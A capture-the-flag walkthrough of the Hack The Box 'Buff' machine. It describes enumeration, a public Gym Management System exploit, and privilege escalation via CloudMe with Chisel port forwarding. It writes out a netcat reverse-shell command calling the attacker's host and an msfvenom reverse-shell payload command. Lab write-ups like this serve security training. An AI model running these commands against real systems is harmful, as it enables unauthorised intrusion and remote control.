---
published: True
title: Hackthebox Buff walkthrough
date: 2021-11-26 03:27:00 +0200
categories: [HTB]
tags: HTB
---

<img src="https://i.ibb.co/WtCrJ77/buff.png" alt="buff" border="0">

<h1>Enumeration</h1>
<blockquote>
<p>ِLet`s begain scanning with NMAP</p>
</blockquote>

<img src="https://i.ibb.co/0rj2J7D/Enumeration.png" alt="Enumeration" border="0">
  
<blockquote>
<p>ِTwo ports are open 8080 , 7680</p>
</blockquote>  
  
<img src="https://i.ibb.co/T40QWjW/HTTP-Page.png" alt="HTTP-Page" border="0">
  
<blockquote>
<p>ِAfter opening the webapp at 8080 i found out it`s from ProjectWorld.in</p>
<p>And i searched for the project</p>
<p>https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/</p> 
<p>I searched for public exploit for the project and i found this <a href="https://www.exploit-db.com/exploits/48506">Exploit</a></p>
</blockquote> 
  
<h1>Exploiting</h1>
<p>Python script</p>
<img src="https://i.ibb.co/J3wX1Y0/Authenticated.png" alt="Authenticated" border="0">

<blockquote>
<p>ِWe got in !</p>
</blockquote>

<blockquote>
<p>ِLet`s upload nc.exe</p>
</blockquote>
<img src="https://i.ibb.co/N9286zX/Uploading.png" alt="Uploading" border="0">

<blockquote>
<p>Let`s get our reverse shell</p> 
<p>ِC:\xampp\htdocs\gym\upload> powershell -c ".\nc.exe 10.10.10.10 1234 -e powershell"</p>
</blockquote>

<img src="https://i.ibb.co/cD5Zn57/Shaun.png" alt="Shaun" border="0">
<blockquote>
<p>ِWe got shell as SHAUN ! , Let`s get the user hash.</p>
</blockquote>

<h1>USER Flag !</h1>

<img src="https://i.ibb.co/nmtcnfR/USER.png" alt="USER" border="0">

<h1>Privilege Escalation</h1>
<blockquote>
<p>I uploaded WinPEAS.exe and after i ran it i found a vulnerable app called Cloudme.exe,it`s running on 8888 port </p>
<p>I search for an exploit and found these</p>
</blockquote>
<img src="https://i.ibb.co/JrfGmMk/image-3.png" alt="image-3" border="0">

<blockquote>
<p>ِWe need to use portforwarding to run the exploit, you can use CHISEL or PLINK.</p>
<p>It should be compiled to exe to run on windows i used golang</p>
<p>env GOOS=windows GOARCH=amd64 go build -o chisel-x64.exe -ldflags "-s -w" </p>
<p>You can compile it by this command</p> 
<p>After compilt it to exe , let`s upload it </p> 
</blockquote>

<img src="https://i.ibb.co/GxG19W1/uploading-chisel.png" alt="uploading-chisel" border="0">


<blockquote>
<p>ِI started the server at 8080 on my machine</p>
</blockquote>

<img src="https://i.ibb.co/8dyHfzN/on-your-linux-server.png" alt="on-your-linux-server" border="0">

<blockquote>
<p>ِWe need to start Chisel on the victim machine to connect</p>
</blockquote>

<img src="https://i.ibb.co/5B6KMN7/Chisel-on-victim.png" alt="Chisel-on-victim" border="0">

<h1>Exploiting Cloudme</h1>
<blockquote>
<p> We need to adjust msfvenom cmd to get a shell to our machine</p> 
<p>So you to copy this and adjust your Ip address to get your shell
"msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 EXITFUNC=thread -b "\x00\x0d\x0a" -f python" 
<a href="https://www.exploit-db.com/exploits/48506">Exploit</a></p>
<p>Run your listner on the port you choosed in the payload then run the EXPLOIT ..</p>
</blockquote>

<img src="https://i.ibb.co/1r8Xqc2/Listner.png" alt="Listner" border="0">


<img src="https://i.ibb.co/b374fJZ/Got-in.png" alt="Got-in" border="0">

<h1>ROOT Flag !</h1>
<img src="https://i.ibb.co/By7fdbL/admin-hash.png" alt="admin-hash" border="0">

<h1>Thanks for Reading 🙏</h1>
